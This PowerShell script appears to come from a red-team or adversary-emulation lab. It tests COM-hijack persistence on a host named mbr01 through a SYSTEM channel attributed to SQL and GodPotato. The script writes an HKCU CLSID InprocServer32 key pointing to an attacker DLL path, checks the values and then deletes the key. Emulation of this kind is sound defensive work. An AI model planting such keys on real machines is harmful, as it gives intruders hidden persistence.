# WT105 - COM hijack validation on mbr01 (SYSTEM via SQL+GodPotato channel)
# Registers HKCU\Software\Classes\CLSID\{GUID}\InprocServer32 -> attacker DLL
# path (persistence artifact), verifies read-back, cleans up. Run from ws01.
$block = @'
$clsid = '{B4F3A835-0D6F-4B8F-9D6B-8A3E1B7C2D5E}'
$key = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
try {
    New-Item -Path $key -Force | Out-Null
    Set-ItemProperty -Path $key -Name '(default)' -Value 'C:\Windows\Temp\wt105-hijack.dll'
    Set-ItemProperty -Path $key -Name 'ThreadingModel' -Value 'Apartment'
    $v = (Get-ItemProperty -Path $key).'(default)'
    Write-Output ('COM_DLL=' + $v)
    Write-Output ('COM_THREADING=' + (Get-ItemProperty -Path $key).ThreadingModel)
    Write-Output ('COM_KEY_EXISTS=' + (Test-Path $key))
} finally {
    Remove-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Output ('COM_CLEANUP=' + (-not (Test-Path "HKCU:\Software\Classes\CLSID\$clsid")))
}
Write-Output 'WT105_DONE'
'@
& C:\Tools\ADTools\campaign-a-t043-system-exec.ps1 -ScriptBlock $block
